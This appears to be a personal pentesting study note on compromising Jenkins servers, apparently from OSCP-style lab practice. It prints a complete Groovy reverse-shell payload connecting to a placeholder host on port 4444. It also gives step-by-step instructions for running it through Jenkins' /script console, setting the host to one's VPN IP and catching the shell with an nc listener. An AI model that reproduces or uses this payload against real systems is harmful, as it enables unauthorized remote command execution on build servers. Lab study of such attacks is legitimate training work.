# Jenkins
﷽
* software tool that automates tasks in software development, such as building, testing and deploying code, to help teams deliver applications faster and more reliably.

## guides and resources

1) `https://cloud.hacktricks.wiki/en/pentesting-ci-cd/jenkins-security/index.html#rce-in-jenkins`

2. `https://github.com/gquere/pwn_jenkins`

3. full reverse shell code:

```groovy
String host="myip";
int port=4444;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```

## usage

* firstly, remember to check the version (bottom-right) with tools such as `searchsploit` for potential exploits.

---

* we can get an ACE (Arbitrary Code Execution) on a server running Jenkins by visiting the Jenkins website:
  * `http://{jenkins-site}/script`
    * this console allows ACE via the language `groovy`. eg. `println("Hello World")` outputs Hello World.

* now, we are to obtain a reverse shell.
  * reverse shells are obtained for multiple reasons:
    1. Simplicity in implementation
    2. Better firewall evasion

* since Jenkins' console uses `groovy`, we are to use a `groovy` payload for this task. The payload can be found at the top of this page, but is also in the file `resources.md` in the root of `~/hacking/oscp/`.

* replace the `host` variable with our IP (the one on utun7 / whatever `ovpn` is using), which can be checked by the command
  * `ifconfig | awk '/^utun[0-9]+:/ { iface=$1 } $1=="inet" && $2 ~ /^10\.10\./ { print iface, $2 }'`

* ensure the `nc` listener is up at the correct port,
  * `nc -ulvnp 4444` where 4444 is the port.
